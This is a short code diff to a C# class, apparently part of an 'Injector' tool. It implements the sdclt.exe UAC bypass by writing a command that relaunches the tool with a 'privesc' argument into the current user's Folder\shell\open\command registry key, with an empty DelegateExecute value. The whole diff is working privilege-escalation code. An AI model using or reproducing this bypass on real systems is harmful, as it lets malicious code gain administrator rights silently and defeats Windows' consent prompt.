@@ -8,11 +8,12 @@ namespace Injector.UACBypass
 {
     public class sdclt
     {
-        public static void bypass(string arguments)
+        public static void bypass(string[] CmdLineArguments)
         {
             //get currrent path
+           Console.WriteLine("Attempting sdclt.exe UAC Bypass");
            string exepath = System.Reflection.Assembly.GetEntryAssembly().Location;
-           SetRegKey(exepath + " " + arguments + " privesc");
+           SetRegKey(exepath + " " + CmdLineArguments[0] + " " + CmdLineArguments[1] + " privesc");
 
         }
 
@@ -20,7 +21,6 @@ namespace Injector.UACBypass
         {
             const string userRoot = "HKEY_CURRENT_USER";
             const string key = userRoot + @"\Software\Classes\Folder\shell\open\command";
-            
 
             Registry.SetValue(key, "", command);
             Registry.SetValue(key, "DelegateExecute", "");
